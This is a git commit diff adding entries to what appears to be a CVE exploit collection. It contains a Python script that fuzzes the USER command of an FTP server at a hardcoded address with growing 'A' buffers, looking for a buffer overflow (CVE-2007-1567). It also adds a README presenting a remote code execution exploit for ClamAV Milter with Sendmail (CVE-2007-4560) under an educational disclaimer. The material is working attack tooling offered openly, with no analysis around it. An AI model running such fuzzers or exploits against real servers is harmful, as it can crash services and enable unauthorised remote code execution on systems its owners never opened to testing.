109d824a2d311185ed6f6b9c38ab751fa5141939
Bhagirath Saxena <72344025+rix4uni@users.noreply.github.com>
2024-10-13 18:32:47 +0530

    Added 2007

---
+++ 2007/CVE-2007-1567/ftp-user-fuzz.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python
+
+import socket
+
+buffer = ["A"]
+counter=100
+
+while len(buffer) < 30:
+	buffer.append("A"*counter)
+	counter=counter+200
+
+for string in buffer:
+	print "Fuzzing USER with %s bytes" % len(string)
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect(("192.168.1.131", 21))
+	s.recv(1024)
+	s.send('USER ' + string + '\r\n')
+	s.recv(1024)
+	s.send('QUIT\r\n')
+	s.close()
+
---
+++ 2007/CVE-2007-4560/README.md
@@ -0,0 +1,4 @@
+# ClamAV-Milter-Sendmail-0.91.2-Remote-Code-Execution
+Exploit for CVE-2007-4560 (ClamAV Milter Sendmail 0.91.2 Remote Code Execution)
+
+The exploit is for educational purposes only and should not be used for malicious purposes.
